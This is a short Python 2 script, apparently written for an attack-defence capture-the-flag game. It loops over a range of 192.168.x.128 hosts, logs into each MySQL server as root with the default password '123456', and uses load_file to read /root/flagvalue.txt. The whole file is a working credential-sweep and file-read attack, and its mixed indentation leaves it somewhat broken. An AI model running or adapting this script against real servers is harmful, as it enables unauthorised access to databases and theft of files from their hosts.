import threading
import MySQLdb as mdb

def login(host):
    try:
        con = mdb.connect(host,'root','123456')
	cur = con.cursor()
	cur.execute('select load_file("/root/flagvalue.txt");')
	f= cur.fetchone()
        	for flag in f: 
		print host,flag
		con.close()
    except Exception,e:
	#print e
        pass

def main():
    for i in range(100,120):
        host = '192.168.' + str(i) + '.128'
	t = threading.Thread(target=login,args=(host,))
	t.start()
if __name__ =='__main__':
    main()
